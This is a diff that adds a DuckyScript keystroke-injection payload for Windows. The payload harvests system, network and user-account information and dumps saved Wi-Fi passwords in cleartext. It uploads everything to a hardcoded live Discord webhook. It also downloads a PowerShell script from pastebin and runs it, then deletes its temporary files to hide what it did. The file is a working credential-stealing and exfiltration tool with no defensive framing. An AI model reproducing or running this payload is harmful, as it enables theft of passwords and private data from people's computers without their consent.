@@ -1,0 +1,79 @@
+GUI R
+
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+
+STRING color 7e
+ENTER
+DELAY 50
+
+STRING SET w=https://discord.com/api/webhooks/1063756479892570143/RnTdB4XUKxYbI1oaQvUOyVYu7WO-J9Y7lwKmB8T9URubAiUPw3lqxk-ZrJewOGarNPsm
+
+DELAY 50
+ENTER
+
+STRING ipconfig > %temp%/IP_Info.txt && systeminfo > %temp%/Systeminfo.txt && curl -H "Accept: application/json" ipinfo.io >> %temp%/IP_Info.txt && wmic cpu get caption, name, deviceid, numberofcores, maxclockspeed, status >> %temp%/Systeminfo.txt  && wmic computersystem get totalphysicalmemory, NumberOfProcessors, Workgroup, UserName, Manufacturer, DNSHostName, PrimaryOwnerName, SystemType, Model >> %temp%/Systeminfo.txt && wmic partition get name,size,type >> %temp%/Systeminfo.txt && wmic nic get macaddress, Name, ProductName, AdapterType, Description, Manufacturer > %temp%/WMIC_NIC.txt && wmic USERACCOUNT get Caption,Name,PasswordRequired,Status,FullName > %temp%/Misc.txt && wmic desktop get Name,Wallpaper,IconTitleFaceName >> %temp%/Misc.txt && wmic bios get Name,ReleaseDate,SerialNumber,Manufacturer >> %temp%/Systeminfo.txt && wmic os get CountryCode, LocalDateTime, Manufacturer, Name, Version, RegisteredUser, NumberOfUsers,NumberOfLicensedUsers >> %temp%/Misc.txt && netsh interface ipv4 show route > %temp%/Network.txt && arp -a >> %temp%/Network.txt && dir > %temp%/Other.txt && cls
+ENTER
+
+DELAY 7000
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/IP_Info.txt" -F "file2=@%temp%/Systeminfo.txt" -F "file3=@%temp%/Network.txt" -F "file4=@%temp%/WMIC_NIC.txt" -F "file5=@%temp%/Misc.txt" -F "file6=@%temp%/Other.txt" %w% && cls
+ENTER
+
+DELAY 500
+STRING echo $WebResponse = Invoke-WebRequest "https://pastebin.com/raw/tDxzPkTH" >script.ps1 && echo $string = $WebResponse.Content >%temp%/script.ps1 >>script.ps1 && echo $code = $string.replace('312312webhook69-url321312','%w%') >>script.ps1 && echo $code ^| Out-File wfsec_haxor1337.ps1 >>script.ps1 && cls
+ENTER
+DELAY 500
+
+STRING Powershell.exe -executionpolicy remotesigned -File script.ps1 && cls
+ENTER
+DELAY 2000
+STRING Powershell.exe -executionpolicy remotesigned -File wfsec_haxor1337.ps1 && cls
+ENTER
+DELAY 2000
+
+STRING exit
+ENTER
+DELAY 500
+
+GUI R
+DELAY 250
+STRING powershell
+DELAY 100
+ENTER
+
+DELAY 500
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File $env:TEMP\wifi.txt
+ENTER
+
+DELAY 500
+STRING exit
+ENTER
+
+DELAY 500
+GUI R
+DELAY 300
+STRING cmd
+DELAY 150
+ENTER
+DELAY 500
+
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file1=@%temp%/wifi.txt" https://discord.com/api/webhooks/1063756479892570143/RnTdB4XUKxYbI1oaQvUOyVYu7WO-J9Y7lwKmB8T9URubAiUPw3lqxk-ZrJewOGarNPsm
+ENTER
+DELAY 500
+
+STRING del /S %temp%/*.txt
+ENTER
+DELAY 100
+
+STRING del script.ps1
+ENTER
+DELAY 100
+
+del wfsec_haxor1337.ps1
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
